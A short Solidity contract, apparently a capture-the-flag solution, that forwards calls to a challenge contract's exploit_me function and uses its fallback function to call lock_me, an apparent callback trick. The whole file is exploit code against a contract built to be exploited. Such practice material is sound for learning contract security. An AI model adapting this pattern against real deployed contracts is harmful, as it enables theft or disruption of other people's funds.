// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IChallenge {
    function exploit_me(address winner) external;

    function lock_me() external;

    function winners(uint256) external view returns (address);
}

contract Contract {
    address CHALLENGE_ADDRESS = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;
    IChallenge challenge = IChallenge(CHALLENGE_ADDRESS);

    function exploit_me(address winner) public returns (bool) {
        challenge.exploit_me(winner);
        return true;
    }

    function winners(uint256 index) public view returns (address) {
        return challenge.winners(index);
    }

    fallback() external {
        challenge.lock_me();
    }
}